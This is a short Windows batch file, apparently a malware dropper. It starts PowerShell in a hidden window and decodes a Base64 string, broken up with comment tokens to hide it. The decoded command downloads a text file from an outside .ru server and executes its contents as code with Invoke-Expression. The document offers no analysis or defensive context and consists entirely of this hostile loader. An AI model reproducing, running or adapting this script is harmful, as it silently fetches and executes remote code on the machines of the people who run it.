@echo off
PowerShell -w Hidden "<#T#>[Text.Encoding]::UTF8.GetString(<#T#>[Convert]::FromBase64String(<#T#>'aWV4IChpd3IgJ2h0dHBzOi8vaXpvenZ1ay5ydS9wcm9jZXNzL0lhc2xjc01vLnR4dCcgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudA=='<#T#>))<#T#>|<#T#>iex"
